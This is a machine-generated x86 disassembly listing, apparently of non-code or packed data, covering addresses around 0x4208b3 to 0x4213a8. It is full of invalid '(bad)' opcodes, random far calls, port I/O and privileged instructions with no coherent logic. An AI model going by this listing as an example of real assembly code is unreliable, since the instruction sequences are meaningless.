  4208b3:	xor    bh,BYTE PTR [ebx-0x7392278f]
  4208b9:	test   esp,0x6fdd3174
  4208bf:	add    ah,BYTE PTR [esi]
  4208c1:	mov    ah,0xf7
  4208c3:	adc    BYTE PTR [edx+eiz*2-0x2c],0xce
  4208c8:	adc    eax,0x1306c251
  4208cd:	jnp    0x4208c1
  4208cf:	mul    edx
  4208d1:	cdq    
  4208d2:	xor    dl,dl
  4208d4:	mov    ecx,0xd58bfeaa
  4208d9:	sar    ch,0x10
  4208dc:	jle    0x420877
  4208de:	mov    ebx,DWORD PTR [esi-0x5f]
  4208e1:	xor    eax,0xae45f84f
  4208e6:	cmc    
  4208e7:	jmp    0x4c4a:0x9f6e6636
  4208ee:	les    edi,FWORD PTR [ebx+0x1b095f21]
  4208f4:	mov    ecx,0x6e226244
  4208f9:	sahf   
  4208fa:	push   ss
  4208fb:	cmp    DWORD PTR [edi],esi
  4208fd:	ret    0x8c8d
  420900:	pushf  
  420901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420902:	call   0xfcb9:0xa4008f5d
  420909:	fwait
  42090a:	and    ah,BYTE PTR [ebp-0x3947c5f7]
  420910:	xor    BYTE PTR [ebp-0xd69d597],dh
  420916:	ins    DWORD PTR es:[edi],dx
  420917:	repnz retf 
  420919:	xchg   ecx,eax
  42091a:	jp     0x42093a
  42091c:	mov    eax,ds:0xb153dde4
  420921:	xor    DWORD PTR [eax],0xffffffa9
  420924:	xchg   esp,eax
  420925:	add    ebx,esi
  420927:	fwait
  420928:	mov    dh,0x72
  42092a:	dec    eax
  42092b:	dec    ecx
  42092c:	in     eax,0xbd
  42092e:	jno    0x4209a4
  420930:	jmp    0x4209a4
  420932:	pushf  
  420933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420934:	push   cs
  420935:	and    al,BYTE PTR [ebp-0x68602d8a]
  42093b:	std    
  42093c:	cmp    ecx,eax
  42093e:	adc    al,0xf2
  420940:	test   eax,0xbd
	...
  4209b1:	add    BYTE PTR [eax],al
  4209b3:	add    BYTE PTR [edx],cl
  4209b5:	inc    ecx
  4209b6:	mov    bh,0xa1
  4209b8:	push   edi
  4209ba:	push   ds
  4209bb:	jmp    0x42097d
  4209bd:	sahf   
  4209be:	fisub  WORD PTR [esi-0x2b]
  4209c1:	hlt    
  4209c2:	adc    al,0x7
  4209c4:	stos   BYTE PTR es:[edi],al
  4209c5:	pop    ebp
  4209c6:	add    DWORD PTR [eax],eax
  4209c8:	test   BYTE PTR [eax],0x0
  4209cb:	add    BYTE PTR [esi+0x77547c5d],dh
  4209d1:	(bad)  
  4209d2:	fidivr DWORD PTR [ebx-0x786b7523]
  4209d8:	push   eax
  4209d9:	add    edi,DWORD PTR [esi+0x59]
  4209dc:	call   0xee65:0x7e2bf97e
  4209e3:	xchg   esi,eax
  4209e4:	retf   
  4209e5:	repnz xchg ecx,eax
  4209e7:	ja     0x420a01
  4209e9:	(bad)  
  4209ea:	push   esp
  4209eb:	fdiv   DWORD PTR ds:0xeb99b072
  4209f1:	es jl  0x4209f1
  4209f4:	pop    esi
  4209f5:	push   eax
  4209f6:	iret   
  4209f7:	inc    edi
  4209f8:	iret   
  4209f9:	push   0xd
  4209fb:	shl    dh,1
  4209fd:	mov    ebp,0x72f9d31c
  420a02:	jmp    0xe34d996f
  420a07:	rcr    BYTE PTR [ecx-0x1897232d],cl
  420a0d:	bound  ecx,QWORD PTR [ebp+0x65731d02]
  420a13:	sbb    bh,dl
  420a15:	pop    ss
  420a16:	mov    DWORD PTR [ebx+0x22],esi
  420a19:	punpckldq mm6,DWORD PTR [edi-0x54]
  420a1d:	jmp    0x420a38
  420a1f:	lods   al,BYTE PTR ds:[esi]
  420a20:	add    dh,BYTE PTR [ebx-0x70]
  420a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a24:	inc    ecx
  420a25:	lock xchg ebp,eax
  420a27:	cmp    al,0x60
  420a29:	sti    
  420a2a:	dec    ebx
  420a2b:	les    esi,FWORD PTR [ebx]
  420a2d:	jp     0x420aac
  420a2f:	icebp  
  420a30:	jle    0x420a83
  420a32:	push   ecx
  420a33:	ss rcl cl,1
  420a36:	in     eax,dx
  420a37:	mov    eax,ds:0xe21e6c6a
  420a3c:	push   0x6a592941
  420a41:	test   BYTE PTR [edi+0x1600477b],bl
  420a47:	div    DWORD PTR [ecx-0x79]
  420a4a:	jg     0x420a1f
  420a4c:	imul   ebp,esi,0xfecfde0
  420a52:	jg     0x420ab3
  420a54:	sbb    ebx,DWORD PTR [edi+0x33]
  420a57:	inc    ecx
  420a58:	mov    ecx,0xdd9b120b
  420a5d:	cmp    al,0xd0
  420a5f:	dec    ecx
  420a60:	mul    edx
  420a62:	mov    ah,0x9e
  420a64:	dec    edx
  420a65:	sar    bl,0xf6
  420a68:	mov    esi,0x1d929785
  420a6d:	aam    0x8f
  420a6f:	jecxz  0x420ae4
  420a71:	and    al,0x86
  420a73:	stos   DWORD PTR es:[edi],eax
  420a74:	xchg   ebx,eax
  420a75:	cdq    
  420a76:	and    edi,edx
  420a78:	pop    ss
  420a79:	mov    edx,0xb7efa575
  420a7e:	fnstcw WORD PTR [esi+0x5]
  420a81:	jns    0x420aed
  420a83:	(bad)  
  420a84:	mov    eax,0x6348d5c6
  420a89:	adc    eax,DWORD PTR [eax]
  420a8b:	fild   WORD PTR [eax+0x59ab44fb]
  420a91:	out    0xcf,al
  420a93:	push   0xffffffc0
  420a95:	mov    ebx,0x1e936d2
  420a9a:	loop   0x420a9e
  420a9c:	loope  0x420aef
  420a9e:	xchg   edi,eax
  420a9f:	xchg   edx,eax
  420aa0:	push   ds
  420aa1:	jmp    0x420ad8
  420aa3:	xchg   esi,eax
  420aa4:	pop    esp
  420aa5:	mov    ds:0xcc8ed248,eax
  420aaa:	add    DWORD PTR [edx+0x56c4ffb8],ebp
  420ab0:	jecxz  0x420af1
  420ab2:	into   
  420ab3:	xor    al,0x54
  420ab5:	sbb    DWORD PTR [eax-0x2a7d7284],eax
  420abb:	push   ebp
  420abc:	jnp    0x420ad6
  420abe:	inc    ebp
  420abf:	int    0x77
  420ac1:	hlt    
	...
  420b32:	add    BYTE PTR [eax],al
  420b34:	fsubr  QWORD PTR [eax]
  420b36:	mov    ah,ah
  420b38:	(bad)  
  420b39:	out    0xfe,al
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	emms   
  420b41:	mov    ebp,0x5ea0547e
  420b46:	add    DWORD PTR [eax],eax
  420b48:	test   BYTE PTR [eax],0x0
  420b4b:	add    BYTE PTR [ecx],dl
  420b4d:	ret    0x7fcd
  420b50:	add    DWORD PTR [edi-0x5b9a56ba],edx
  420b56:	test   eax,0xc94290b0
  420b5b:	stos   BYTE PTR es:[edi],al
  420b5c:	dec    esp
  420b5d:	push   0xffffffde
  420b5f:	pop    ebx
  420b60:	inc    edi
  420b61:	scas   al,BYTE PTR es:[edi]
  420b62:	inc    ebx
  420b63:	and    eax,0xe22c9c6e
  420b68:	into   
  420b69:	(bad)  
  420b6a:	and    eax,0xdfc02b66
  420b6f:	ret    0x7e42
  420b72:	dec    eax
  420b73:	cwde   
  420b74:	sahf   
  420b75:	pop    ebp
  420b76:	ja     0x420b3e
  420b78:	mov    ds:0x652b5337,eax
  420b7d:	xchg   esi,eax
  420b7e:	sbb    esi,edx
  420b80:	aam    0xee
  420b82:	xor    BYTE PTR [edx],bh
  420b84:	mov    ch,0x88
  420b86:	xchg   DWORD PTR [edx+esi*2+0x1586af06],edx
  420b8d:	jecxz  0x420b10
  420b8f:	shr    DWORD PTR [edi-0x4d],1
  420b92:	xchg   ebx,eax
  420b93:	xchg   esp,eax
  420b94:	sub    eax,0x7ba99f6f
  420b99:	ds (bad) 
  420b9b:	fxch   st(7)
  420b9d:	jbe    0x420bc4
  420b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba0:	adc    eax,0xd3e65bf3
  420ba5:	inc    esi
  420ba6:	bound  esp,QWORD PTR [eax-0x2a61491e]
  420bac:	mov    cl,0x24
  420bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420baf:	shl    esi,cl
  420bb1:	inc    ebp
  420bb2:	outs   dx,DWORD PTR ds:[esi]
  420bb3:	push   edi
  420bb4:	and    BYTE PTR [ebx-0x3c],ah
  420bb7:	push   eax
  420bb8:	mov    eax,0x8ebbbbb7
  420bbd:	enter  0x31d4,0xb3
  420bc1:	mov    DWORD PTR [eax],ebx
  420bc3:	xlat   BYTE PTR ds:[ebx]
  420bc4:	lods   eax,DWORD PTR ds:[esi]
  420bc5:	dec    eax
  420bc6:	ins    BYTE PTR es:[edi],dx
  420bc7:	(bad)  
  420bc9:	jl     0x420bfe
  420bcb:	push   es
  420bcc:	and    DWORD PTR [ecx-0x1eb17797],0x57e58700
  420bd6:	sar    DWORD PTR [esi+0x5cbca98d],1
  420bdc:	sahf   
  420bdd:	pop    ss
  420bde:	push   edi
  420bdf:	in     eax,0x6c
  420be1:	mov    ah,0x48
  420be3:	inc    edi
  420be4:	xchg   ebp,eax
  420be6:	push   cs
  420be7:	or     eax,0x18021cf
  420bec:	push   ebp
  420bed:	mov    BYTE PTR [ebx+0x5e],0x24
  420bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bf2:	fisubr WORD PTR [ebp+ebx*1+0x3ec41735]
  420bf9:	mov    eax,ds:0xaafa44eb
  420bfe:	xchg   dh,al
  420c00:	std    
  420c01:	call   0x4b635116
  420c06:	xor    al,0x1e
  420c08:	fucomip st,st(2)
  420c0a:	mov    ch,0x91
  420c0c:	les    ebx,FWORD PTR ds:0x9a9c4353
  420c12:	fisub  WORD PTR [edx-0x568a7f86]
  420c18:	imul   esp,DWORD PTR [eax+0x3b61605],0x7e
  420c1f:	popf   
  420c20:	jg     0x420c6c
  420c22:	ficomp WORD PTR [edx+edx*2+0x3d83612a]
  420c29:	call   0xf348dd23
  420c2e:	sbb    ch,BYTE PTR [edi+ecx*8]
  420c31:	mov    ah,0x2b
  420c33:	mov    bl,0xcc
  420c35:	inc    edi
  420c36:	loope  0x420c1a
  420c38:	leave  
  420c39:	adc    al,0x7c
  420c3b:	jg     0x420c4e
  420c3d:	fiadd  WORD PTR [eax+0x1c]
  420c40:	cmp    ebx,DWORD PTR [edi+0x0]
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x2592055f
  420cc3:	cld    
  420cc4:	xchg   esi,eax
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	test   BYTE PTR [eax],0x0
  420ccb:	add    dh,cl
  420ccd:	cmp    BYTE PTR ds:0xae7656ac,al
  420cd3:	adc    ah,BYTE PTR [edx-0x108d1d85]
  420cd9:	sub    bh,BYTE PTR [eax]
  420cdb:	(bad)  
  420cdc:	lods   al,BYTE PTR ds:[esi]
  420cdd:	sti    
  420cde:	ficomp WORD PTR [eax]
  420ce0:	out    dx,al
  420ce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ce2:	pop    ecx
  420ce3:	add    BYTE PTR [ecx-0x2],cl
  420ce6:	(bad)  
  420ce8:	(bad)  
  420ce9:	retf   0xe262
  420cec:	cmp    eax,ebx
  420cee:	mov    dl,BYTE PTR [ebx]
  420cf0:	inc    ecx
  420cf1:	clc    
  420cf2:	call   0x2c54:0x37fe8ce
  420cf9:	jl     0x420c9b
  420cfb:	push   cs
  420cfc:	mov    cl,0x23
  420cfe:	daa    
  420cff:	xor    esi,DWORD PTR [esp+ecx*8-0x45]
  420d03:	push   edi
  420d04:	mov    eax,ds:0x2ecd9889
  420d09:	and    BYTE PTR [edi],0x86
  420d0c:	mov    al,ds:0xde941451
  420d11:	push   esi
  420d12:	cli    
  420d13:	xor    al,0x14
  420d15:	gs fwait
  420d17:	repz fld QWORD PTR [ebx]
  420d1a:	push   eax
  420d1b:	or     ch,ch
  420d1d:	mov    ds:0xb75dc12e,al
  420d22:	mov    dh,0x2c
  420d24:	dec    DWORD PTR [ebx]
  420d26:	push   DWORD PTR ds:0x34af627f
  420d2c:	xor    DWORD PTR [edx-0x6d3b02db],0x34
  420d33:	inc    esp
  420d34:	fbstp  TBYTE PTR [ecx-0x5c928f09]
  420d3a:	ret    0xaa2b
  420d3d:	into   
  420d3e:	popf   
  420d3f:	test   al,0x25
  420d41:	and    al,0x9
  420d43:	jb     0x420d83
  420d45:	std    
  420d46:	leave  
  420d47:	pop    esi
  420d48:	lods   al,BYTE PTR ds:[esi]
  420d49:	push   edi
  420d4a:	sub    DWORD PTR [ebx+0x4c],eax
  420d4d:	add    ah,ah
  420d4f:	pop    esi
  420d50:	mov    ah,0xa5
  420d52:	ss jnp 0x420d84
  420d55:	rcr    DWORD PTR [ecx],cl
  420d57:	mov    ebp,0x7007ea75
  420d5c:	(bad)  
  420d5d:	xor    DWORD PTR [eax],ebp
  420d5f:	push   eax
  420d60:	inc    edi
  420d61:	push   0x8c173404
  420d66:	or     BYTE PTR [ebx-0xfe56865],cl
  420d6c:	and    dl,BYTE PTR [esi-0x7a]
  420d6f:	xchg   esi,eax
  420d70:	(bad)  
  420d71:	loop   0x420d3b
  420d73:	adc    BYTE PTR [ebx],cl
  420d75:	cmp    BYTE PTR [ebp-0x75],al
  420d78:	jg     0x420dd3
  420d7a:	or     eax,0x16691e69
  420d7f:	imul   esp,esp,0x567bc514
  420d85:	js     0x420df1
  420d87:	inc    ebx
  420d88:	arpl   WORD PTR [edx],si
  420d8a:	mov    bh,0x9d
  420d8c:	test   ah,cl
  420d8e:	mov    ebp,0xa3270d4a
  420d93:	jne    0x420d92
  420d95:	sub    al,0x3f
  420d97:	lods   eax,DWORD PTR ds:[esi]
  420d98:	fmulp  st(5),st
  420d9a:	call   0x9a32:0xf2674d14
  420da1:	(bad)  
  420da2:	call   0x564e7697
  420da7:	pop    edx
  420da8:	mov    al,ds:0x54491155
  420dad:	cld    
  420dae:	loope  0x420d80
  420db0:	mov    bh,al
  420db2:	pop    esp
  420db3:	sbb    edi,DWORD PTR [eax]
  420db5:	ror    BYTE PTR [eax+esi*2],0xae
  420db9:	fnclex 
  420dbb:	mov    DWORD PTR [ebp+0x517bf2f0],ebx
  420dc1:	aaa    
	...
  420e32:	add    BYTE PTR [eax],al
  420e34:	stos   BYTE PTR es:[edi],al
  420e35:	push   ebp
  420e36:	call   0x645d:0xffefffe7
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	or     DWORD PTR [eax+0x608c94a4],edi
  420e46:	add    DWORD PTR [eax],eax
  420e48:	test   BYTE PTR [eax],0x0
  420e4b:	add    ah,ah
  420e4d:	mov    WORD PTR [edi+ebx*1],fs
  420e50:	sahf   
  420e51:	mov    esi,0xa8d99584
  420e56:	mov    edx,0x807537a4
  420e5b:	loop   0x420e60
  420e5d:	mov    WORD PTR [edx],?
  420e5f:	cdq    
  420e60:	push   ss
  420e61:	call   ecx
  420e63:	test   al,0x90
  420e65:	imul   esp,DWORD PTR [edx],0xf9680464
  420e6b:	enter  0xb1cc,0xbb
  420e6f:	pop    ebx
  420e70:	data16 jl 0x420e0f
  420e73:	xchg   BYTE PTR [eax-0x7a],bl
  420e76:	pop    es
  420e77:	dec    esp
  420e78:	lahf   
  420e79:	rol    BYTE PTR [edi],cl
  420e7b:	dec    edi
  420e7c:	aaa    
  420e7d:	test   al,0x40
  420e7f:	sub    DWORD PTR [edx-0x57df6ef5],edi
  420e85:	pop    esi
  420e86:	shr    DWORD PTR [eax+0x1b],cl
  420e89:	out    0x8a,eax
  420e8b:	or     ch,BYTE PTR [edi]
  420e8d:	es add ebx,ecx
  420e90:	and    eax,0x9d27617e
  420e95:	iret   
  420e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e97:	int3   
  420e98:	pop    esi
  420e99:	push   ecx
  420e9a:	in     al,dx
  420e9b:	pop    ss
  420e9c:	dec    edi
  420e9d:	push   ecx
  420e9e:	dec    ebx
  420e9f:	mov    dl,0xb1
  420ea1:	lea    eax,[ecx-0x19]
  420ea4:	test   DWORD PTR [ecx+0x65e1c0e5],0x381492fa
  420eae:	sub    eax,0xef5e24de
  420eb3:	and    BYTE PTR [ecx],bl
  420eb5:	mov    dh,BYTE PTR [eax+eax*1+0x12]
  420eb9:	rcl    BYTE PTR [edi+0x78],cl
  420ebc:	sub    eax,DWORD PTR [edx]
  420ebe:	dec    ebp
  420ebf:	ins    BYTE PTR es:[edi],dx
  420ec0:	mov    ds:0x4cc8f36b,eax
  420ec5:	sub    eax,0xc7d906ef
  420eca:	cmc    
  420ecb:	add    WORD PTR [ebx+eax*2+0x18],0xfff7
  420ed1:	ret    0xd15f
  420ed4:	rcl    bl,0x2a
  420ed7:	dec    eax
  420ed8:	pusha  
  420ed9:	cld    
  420eda:	xlat   BYTE PTR ds:[ebx]
  420edb:	test   eax,0x51cd48ef
  420ee0:	sbb    al,0x9c
  420ee2:	jg     0x420f34
  420ee4:	mov    ds:0xa1e2933b,eax
  420ee9:	add    al,ch
  420eeb:	cmp    eax,0x154acf2d
  420ef0:	sub    ah,BYTE PTR [ebx+0x48]
  420ef3:	mov    WORD PTR [edx-0x38569f05],ds
  420ef9:	adc    DWORD PTR [esp+esi*2],esi
  420efc:	cwde   
  420efd:	push   ss
  420efe:	xchg   BYTE PTR [edx+eiz*1+0x1a3202db],dh
  420f05:	repnz aad 0xce
  420f08:	cdq    
  420f09:	jns    0x420ef4
  420f0b:	cmp    eax,0x19169fe0
  420f10:	das    
  420f11:	push   es
  420f12:	xor    cl,BYTE PTR [edx+ebp*4-0x2f3085f7]
  420f19:	ins    DWORD PTR es:[edi],dx
  420f1a:	stos   BYTE PTR es:[edi],al
  420f1b:	sbb    eax,0x79d20085
  420f20:	inc    ebx
  420f21:	(bad)  
  420f23:	loop   0x420eb2
  420f25:	mov    ch,0x7f
  420f27:	xchg   BYTE PTR [ebx+eax*4-0x7986d2b3],ah
  420f2e:	jmp    0x420f69
  420f30:	jmp    0x420f81
  420f32:	sbb    al,0x45
  420f34:	data16 sub BYTE PTR [edx+0x136fd647],al
  420f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f3c:	aas    
  420f3d:	repz call 0x0:0xbf455d
	...
  420fb1:	add    BYTE PTR [eax],al
  420fb3:	add    BYTE PTR [edx-0x5b],ah
  420fb6:	jbe    0x421037
  420fb8:	idiv   edi
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0xffffffa6
  420fc1:	mov    dh,0x6b
  420fc3:	xchg   edx,eax
  420fc4:	and    BYTE PTR [ecx+0x1],0x0
  420fc8:	test   BYTE PTR [eax],0x0
  420fcb:	add    dh,ah
  420fcd:	icebp  
  420fce:	in     eax,dx
  420fcf:	aas    
  420fd0:	inc    eax
  420fd1:	adc    eax,0xcf4218b9
  420fd6:	sbb    DWORD PTR [esi-0x47],ecx
  420fd9:	jl     0x420fd9
  420fdb:	sbb    al,0xd5
  420fdd:	xchg   esi,eax
  420fde:	cs loope 0x420f81
  420fe1:	xchg   BYTE PTR ds:0xcd8e3b34,dl
  420fe7:	mov    ch,0x40
  420fe9:	push   esp
  420fea:	or     DWORD PTR [ebp+edi*1+0x76],ebx
  420fee:	mov    edi,0x4b99b73f
  420ff3:	outs   dx,DWORD PTR ds:[esi]
  420ff4:	xchg   esi,eax
  420ff5:	loopne 0x42100c
  420ff7:	dec    ebp
  420ff8:	mov    ebx,0x542881c0
  420ffd:	test   DWORD PTR [ecx],eax
  420fff:	retf   
  421000:	push   ebx
  421001:	push   0x5134cb93
  421006:	add    ebx,DWORD PTR [ebp-0x17ecbe33]
  42100c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42100d:	outs   dx,BYTE PTR ds:[esi]
  42100e:	mov    bl,0x92
  421010:	into   
  421011:	(bad)  
  421012:	pop    esi
  421013:	mov    al,0x8d
  421015:	push   0x30a33f2a
  42101a:	fs push 0x17
  42101d:	mov    ecx,0x3df80a51
  421022:	add    DWORD PTR [edx+ebp*1+0xb8531cf],esp
  421029:	mov    DWORD PTR [ebp-0x25133ef4],edi
  42102f:	test   al,0xa6
  421031:	pop    ebx
  421032:	in     eax,0xde
  421034:	(bad)  
  421035:	fbstp  TBYTE PTR [edi+0x3c]
  421038:	xor    ch,ch
  42103a:	mov    esp,0xfcbad7c3
  42103f:	jge    0x421040
  421041:	xor    eax,0xf39af945
  421046:	mov    DWORD PTR [ebp-0x550db0ee],esi
  42104c:	out    dx,eax
  42104d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42104e:	cwde   
  42104f:	jno    0x421028
  421051:	fidiv  WORD PTR [edx-0x1e140d7e]
  421057:	retf   0xbdfa
  42105a:	mov    al,0x6f
  42105c:	mov    dh,0xd5
  42105e:	sbb    al,0xbd
  421060:	or     DWORD PTR [ecx],ecx
  421062:	jo     0x4210cd
  421064:	out    dx,eax
  421065:	adc    eax,0x929b434f
  42106a:	mov    BYTE PTR gs:[edi],0x92
  42106e:	mov    dh,0xa2
  421070:	cmp    bl,BYTE PTR [esi-0x2d8a5c9d]
  421076:	sub    dh,BYTE PTR [esi-0x32]
  421079:	jmp    0x421042
  42107b:	sbb    BYTE PTR [ecx+0x52ef94a1],0x8c
  421082:	sbb    al,0xd2
  421084:	jmp    0x4266a826
  421089:	xor    edi,edi
  42108b:	test   al,0xf7
  42108d:	push   esp
  42108e:	aam    0x9b
  421090:	add    ch,BYTE PTR [eax+0x6e5b0f99]
  421096:	addr16 popa 
  421098:	jge    0x4210f2
  42109a:	cmp    edx,DWORD PTR [ecx+ecx*1+0x53]
  42109e:	loopne 0x4210fd
  4210a0:	shl    cl,cl
  4210a2:	jmp    0xd72848de
  4210a7:	add    al,0xc
  4210a9:	mov    ch,0xe9
  4210ab:	xor    esp,ebx
  4210ad:	fcomp  QWORD PTR [edx-0x64]
  4210b0:	aas    
  4210b1:	mov    ds:0xb07558f9,eax
  4210b6:	dec    edi
  4210b7:	push   ss
  4210b8:	jo     0x421049
  4210ba:	dec    esi
  4210bb:	sar    BYTE PTR [esi],cl
  4210bd:	(bad)  
  4210bf:	inc    ebx
  4210c0:	dec    esi
  4210c1:	mov    edi,0x0
	...
  421132:	add    BYTE PTR [eax],al
  421134:	jae    0x421105
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x421171
  421141:	mov    ebx,0x62781b67
  421146:	add    DWORD PTR [eax],eax
  421148:	test   BYTE PTR [eax],0x0
  42114b:	add    cl,ch
  42114d:	retf   
  42114e:	xor    bl,al
  421150:	test   BYTE PTR [eax+0x5ee9dec9],al
  421156:	sub    al,0x23
  421158:	adc    eax,0x40d75dcd
  42115d:	mov    eax,0x10a34f80
  421162:	mov    dl,0xb4
  421164:	dec    ebx
  421165:	adc    bl,BYTE PTR [edx]
  421167:	push   es
  421168:	mov    WORD PTR [edx-0x3c],ss
  42116b:	inc    ebx
  42116c:	add    esp,esp
  42116e:	iret   
  42116f:	push   ecx
  421170:	ins    DWORD PTR es:[edi],dx
  421171:	lahf   
  421172:	pop    ebp
  421173:	int3   
  421174:	sub    al,ch
  421176:	enter  0x40c2,0xb2
  42117a:	mov    esi,0x46b98af1
  42117f:	or     DWORD PTR [ecx*4-0x331ad024],esi
  421186:	hlt    
  421187:	retf   0x7d44
  42118a:	jmp    FWORD PTR [ecx-0x62810a8d]
  421190:	in     eax,0x6e
  421192:	or     ebx,DWORD PTR [eax]
  421194:	inc    edi
  421195:	test   BYTE PTR [eax+0x4b],dh
  421198:	mov    cl,0xae
  42119a:	sub    esp,ebp
  42119c:	cmp    dl,al
  42119e:	aam    0x48
  4211a0:	std    
  4211a1:	cld    
  4211a2:	xchg   BYTE PTR [esi-0x7f8eb8f3],ch
  4211a8:	dec    ebp
  4211a9:	sub    esi,edi
  4211ab:	dec    esp
  4211ac:	add    DWORD PTR [esi],0xffffffb6
  4211af:	push   edi
  4211b0:	call   0x96ba91
  4211b5:	mov    esp,edi
  4211b7:	and    eax,0x4c3bfe0c
  4211bc:	rol    BYTE PTR [ecx*4-0x24bee77d],cl
  4211c3:	jnp    0x421177
  4211c5:	mov    BYTE PTR [edx],al
  4211c7:	xor    al,0x88
  4211c9:	call   0x4c12dcc8
  4211ce:	aam    0x7e
  4211d0:	jmp    0x4211c9
  4211d2:	repnz push esp
  4211d4:	xor    eax,0x749c2069
  4211d9:	je     0x42123d
  4211db:	ret    0xf34c
  4211de:	mov    BYTE PTR [eax+ebp*2-0x6928be01],ch
  4211e5:	sub    eax,0x5056e37
  4211ea:	outs   dx,DWORD PTR ds:[esi]
  4211eb:	adc    ah,ch
  4211ed:	jp     0x4211f1
  4211ef:	fwait
  4211f0:	inc    eax
  4211f1:	ret    0x9675
  4211f4:	not    ch
  4211f6:	nop
  4211f7:	mov    cl,0x44
  4211f9:	cdq    
  4211fa:	ins    DWORD PTR es:[edi],dx
  4211fb:	jae    0x421250
  4211fd:	mov    bl,0x3d
  4211ff:	je     0x42124e
  421201:	jp     0x421205
  421203:	dec    edi
  421204:	aam    0x35
  421206:	ins    DWORD PTR es:[edi],dx
  421207:	es add ebp,ecx
  42120a:	in     al,dx
  42120b:	scas   al,BYTE PTR es:[edi]
  42120c:	cmp    BYTE PTR [eax-0x72a0f175],dl
  421212:	jecxz  0x421245
  421214:	cmp    DWORD PTR [ecx-0x55],edi
  421217:	xchg   edi,eax
  421218:	sar    DWORD PTR [esi],1
  42121a:	lea    edi,[ecx-0xb]
  42121d:	pop    ebp
  42121e:	mov    eax,0x1bdc174
  421223:	test   eax,0x51678e14
  421228:	out    0xa0,eax
  42122a:	out    0xcf,eax
  42122c:	bound  ebp,QWORD PTR [edx+eax*4+0x7d]
  421230:	retf   0xf007
  421233:	lahf   
  421234:	iret   
  421235:	mov    eax,0xe6a8bc43
  42123a:	mov    BYTE PTR [esi],0xf0
  42123d:	xor    DWORD PTR [esi+0x6f],eax
  421240:	adc    DWORD PTR fs:[eax],eax
	...
  4212b3:	add    BYTE PTR [ecx+0x6],al
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0x9583dc15
  4212c1:	ins    BYTE PTR es:[edi],dx
  4212c2:	push   ebx
  4212c3:	shr    DWORD PTR [esi+0x63],cl
  4212c6:	add    DWORD PTR [eax],eax
  4212c8:	test   BYTE PTR [eax],0x0
  4212cb:	add    BYTE PTR [ecx],dl
  4212cd:	sub    eax,DWORD PTR [edx+edi*1-0x1241a02b]
  4212d4:	mov    edi,DWORD PTR [esi]
  4212d6:	mov    ebp,eax
  4212d8:	loop   0x421351
  4212da:	mov    al,0x9e
  4212dc:	mov    dh,0x57
  4212de:	into   
  4212df:	and    DWORD PTR [edi+0x1e],edi
  4212e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212e3:	shl    edx,cl
  4212e5:	mov    ebp,0xd028b8b1
  4212ea:	dec    esi
  4212eb:	imul   DWORD PTR [edi]
  4212ed:	push   ds
  4212ee:	mov    esi,0x7ef88bde
  4212f3:	xor    DWORD PTR [ebx+eax*1-0x27328130],esi
  4212fa:	aad    0x76
  4212fc:	rcl    BYTE PTR [edx+esi*1+0x49],0x92
  421301:	push   ecx
  421302:	mov    eax,ds:0xbce85a3b
  421307:	add    DWORD PTR [edi-0x307edfdc],ebp
  42130d:	outs   dx,DWORD PTR ds:[esi]
  42130e:	mov    dl,0xf1
  421310:	add    edi,0x4d
  421313:	fs nop
  421315:	pop    eax
  421316:	dec    edx
  421317:	lea    esi,[ebx]
  421319:	leave  
  42131a:	ds dec ebp
  42131c:	rcr    esi,0x16
  42131f:	outs   dx,DWORD PTR ds:[esi]
  421320:	int    0x2c
  421322:	stc    
  421323:	ds ret 
  421325:	pop    ebp
  421326:	cmp    al,0xc9
  421328:	cmp    al,0x7a
  42132a:	inc    esp
  42132b:	pop    ebp
  42132c:	out    dx,al
  42132d:	jmp    0x309278b
  421332:	xor    eax,0x300c86de
  421337:	mov    ds,WORD PTR [eax+edx*8-0x7a2731c5]
  42133e:	dec    esp
  42133f:	xor    DWORD PTR [edx],ebp
  421341:	(bad)  
  421342:	out    dx,al
  421343:	repz sar BYTE PTR [edi+0x76130fd],cl
  42134a:	jp     0x4213c5
  42134c:	or     al,0x7a
  42134e:	xor    edx,DWORD PTR [edx+0xcc135af]
  421354:	sub    eax,0xc65bf639
  421359:	mov    fs,ecx
  42135b:	pop    ds
  42135c:	cwde   
  42135d:	adc    dl,cl
  42135f:	fdivr  QWORD PTR [edi+0xe]
  421362:	jae    0x42135a
  421364:	mov    bl,0xae
  421366:	sbb    eax,0xea367c31
  42136b:	repz dec eax
  42136d:	addr16 adc al,0xf1
  421370:	clc    
  421371:	push   ss
  421372:	add    eax,0x4ffc82e9
  421377:	mov    al,ds:0x9d3dbf30
  42137c:	fldenv [ebp+0x37]
  42137f:	outs   dx,BYTE PTR ds:[esi]
  421380:	in     eax,dx
  421381:	add    DWORD PTR [ebp+0x33745004],0x2b5b26f5
  42138b:	(bad)  
  42138c:	pop    esi
  42138d:	call   0x471b7527
  421392:	aas    
  421393:	pop    ds
  421394:	xor    eax,0x23f2a246
  421399:	dec    edi
  42139a:	sub    eax,0x3ef3a9d2
  42139f:	sub    edx,DWORD PTR [ebx+0x75]
  4213a2:	lds    ebp,FWORD PTR ds:0x83d65063
  4213a8:	xlat   BYTE PTR ds:[ebx]
